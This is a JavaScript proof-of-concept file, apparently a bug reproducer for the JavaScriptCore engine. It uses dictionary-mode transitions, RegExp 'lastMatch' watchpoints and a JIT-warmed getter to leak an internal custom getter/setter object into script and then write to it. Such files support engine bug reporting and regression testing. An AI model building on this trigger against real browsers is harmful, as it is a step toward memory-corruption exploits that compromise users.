async function asyncSleep(ms) {
    return new Promise(resolve => {
        setTimeout(() => {
            resolve();
        }, ms);
    });
}

function reifyAllStaticProperties(object) {
    Object.assign({}, object);
}

function setHasBeenDictionary(object) {
    for (let i = 0; i < 100; i++) {
        object.b = 1;
        delete object.b;
    }

    for (const x in Object.create(object)) {

    }
}

function watchToJSONForReplacements(object) {
    JSON.stringify(Object.create(object));
}

async function watchLastMatchForReplacements(object) {
    const tmp = Object.create(object);
    function getLastMatch() {
        return tmp.lastMatch;
    }

    for (let i = 0; i < 2000; i++) {
        try {
            getLastMatch();
        } catch {

        }
    }

    await asyncSleep(500);
}

const target = {
    toJSON: (() => {
        const object = {};
        for (let i = 0; i < 10; i++) {
            object['a' + i] = 1;
        }

        object.lastMatch = 0x8888;

        return object;
    })()
};

function opt() {
    return target.toJSON.lastMatch;
}

async function main() {
    setHasBeenDictionary(target);

    reifyAllStaticProperties(RegExp);
    await watchLastMatchForReplacements(RegExp);

    for (let i = 0; i < 2000; i++) {
        opt();
    }

    await asyncSleep(200);

    target.toJSON = RegExp;
    target.b = 1;

    watchToJSONForReplacements(target);

    await asyncSleep(1000);

    const custom_getter_setter = opt();
    describe(custom_getter_setter);

    custom_getter_setter.x = 1;
}

main();
